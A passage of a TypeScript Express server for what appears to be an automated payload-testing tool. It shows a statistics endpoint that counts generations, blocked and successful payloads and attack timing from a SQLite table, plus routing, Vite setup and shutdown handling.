      let whereClause = "";
      let params: any[] = [];
      if (targetName) {
        whereClause = " WHERE target_name = ? ";
        params.push(targetName);
      }

      const totalGen = db.prepare(`SELECT MAX(generation_num) as maxGen FROM experience ${whereClause}`).get(...params).maxGen || 0;
      const totalPayloads = db.prepare(`SELECT COUNT(*) as count FROM experience ${whereClause}`).get(...params).count;
      const smartBlocked = db.prepare(`SELECT COUNT(*) as count FROM experience ${whereClause} ${whereClause ? 'AND' : 'WHERE'} status = 'PREDICTIVE_BLOCKED'`).get(...params).count;
      const wafBlocked = db.prepare(`SELECT COUNT(*) as count FROM experience ${whereClause} ${whereClause ? 'AND' : 'WHERE'} ((score <= 0.1 AND status != 'PREDICTIVE_BLOCKED') OR status = 'WAF_BLOCKED')`).get(...params).count;
      const successCount = db.prepare(`SELECT COUNT(*) as count FROM experience ${whereClause} ${whereClause ? 'AND' : 'WHERE'} score >= 0.8`).get(...params).count;
      const sqlErrors = db.prepare(`SELECT COUNT(*) as count FROM experience ${whereClause} ${whereClause ? 'AND' : 'WHERE'} error_msg IS NOT NULL AND error_msg != ''`).get(...params).count;
      
      const timeStmt = db.prepare(`SELECT MIN(timestamp) as start, MAX(timestamp) as end FROM experience ${whereClause}`);
      const times = timeStmt.get(...params);
      let durationSeconds = 0;
      if (times.start && times.end) {
        durationSeconds = (new Date(times.end).getTime() - new Date(times.start).getTime()) / 1000;
      }

      const minutes = Math.floor(durationSeconds / 60);
      const seconds = Math.floor(durationSeconds % 60);

      // Convergence logic (first success time)
      const firstSuccessStmt = db.prepare(`SELECT MIN(timestamp) as time FROM experience ${whereClause} ${whereClause ? 'AND' : 'WHERE'} score >= 0.8`);
      const successTime = firstSuccessStmt.get(...params).time;
      let convergenceSeconds = 0;
      if (times.start && successTime) {
        convergenceSeconds = (new Date(successTime).getTime() - new Date(times.start).getTime()) / 1000;
      }

      res.json({
        totalGenerations: totalGen,
        totalPayloads,
        smartAgentBlocked: smartBlocked,
        wafBlocked,
        successfulPayloads: successCount,
        sqlErrorPayloads: sqlErrors,
        attackDuration: {
          seconds: durationSeconds,
          formatted: `${minutes}:${seconds.toString().padStart(2, '0')}`
        },
        convergence: {
          seconds: convergenceSeconds,
          formatted: `${Math.floor(convergenceSeconds / 60)}:${Math.floor(convergenceSeconds % 60).toString().padStart(2, '0')}`
        }
      });
    } catch (err: any) {
      res.status(500).json({ error: err.message });
    }
  });

  // API 404 handler - MUST be after all other API routes
  app.all("/api/*", (req, res) => {
    res.status(404).json({ error: `Route ${req.method} ${req.path} not found` });
  });

  // Vite middleware for development
  if (process.env.NODE_ENV !== "production") {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "spa",
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), 'dist');
    app.use(express.static(distPath));
    app.get('*', (req, res) => {
      res.sendFile(path.join(distPath, 'index.html'));
    });
  }

  const server = app.listen(PORT, "0.0.0.0", () => {
    console.log(`Server running on http://localhost:${PORT}`);
  });

  // Graceful shutdown
  const shutdown = () => {
    console.log("[SYSTEM] Shutting down server...");
    db.close();
    server.close(() => {
      process.exit(0);
    });
  };

  process.on('SIGINT', shutdown);
  process.on('SIGTERM', shutdown);

  server.on('error', (err: any) => {
    if (err.code === 'EADDRINUSE') {
      console.error(`[ERROR] Port ${PORT} is already in use. Please close the other server or change the port.`);
      process.exit(1);
    } else {
      console.error('[ERROR] Server error:', err);
    }
  });
}

startServer().catch(err => {
  console.error("[CRITICAL] Server failed to start:", err);
});
